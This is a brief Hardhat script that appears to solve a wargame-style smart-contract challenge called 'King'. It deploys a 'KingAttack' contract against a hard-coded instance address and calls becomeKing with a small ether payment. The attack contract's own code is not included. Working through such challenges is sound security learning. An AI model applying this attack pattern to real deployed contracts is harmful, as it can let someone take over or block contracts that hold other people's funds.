const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x0B2C35E23C4aa162d137F0c24aec79Bd25853Fae";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("KingAttack");
  const contract = await Contract.deploy(instanceAddress);

  // Attack

  await contract.becomeKing({
    value: ethers.utils.parseEther("0.001"),
    gasLimit: 200000,
  });
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
